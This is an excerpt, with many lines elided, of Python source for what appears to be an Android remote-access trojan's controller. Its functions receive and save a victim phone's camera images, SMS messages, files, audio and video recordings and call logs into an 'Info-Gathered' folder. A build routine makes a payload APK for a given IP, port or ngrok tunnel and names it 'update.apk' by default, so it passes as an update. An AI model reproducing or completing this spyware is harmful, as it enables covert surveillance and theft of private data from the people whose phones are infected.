...
if not os.path.isdir(os.getcwd()+direc+"Info-Gathered"):
    os.makedirs("Info-Gathered")
...
def getImage(client):
    ...
    flag=0
    filename ="Info-Gathered"+direc+"Image_"+timestr+'.jpg'
...
def readSMS(client,data):
    ...
    msg = "start"
    timestr = time.strftime("%Y%m%d-%H%M%S")
    filename = "Info-Gathered"+direc+data+"_"+timestr+'.txt'
    flag =0
...
def getFile(filename,ext,data):
    fileData = "Info-Gathered"+direc+filename+"."+ext
    flag=0
...
def stopAudio(client):
    ...
    filename = "Info-Gathered"+direc+"Audio_"+timestr+".mp4"
...
def stopVideo(client):
    ...
    data=recvall(client) 
    data = data.strip().replace("END123","").strip()
    filename = "Info-Gathered"+direc+"Video_"+timestr+'.mp4' 
...
def callLogs(client):
    ...
    timestr = time.strftime("%Y%m%d-%H%M%S")
    msg = recvall(client)
    filename = "Info-Gathered"+direc+"Call_Logs_"+timestr+'.txt'
...
def build(ip,port,output,ngrok=False,ng=None,icon=None):
   ...
   # if float(version_no) < 1.8: print(stdOutput("error")+"Java 8 is required ");exit()
    ...
    outFileName = output if output else "update.apk"
    que = queue.Queue()
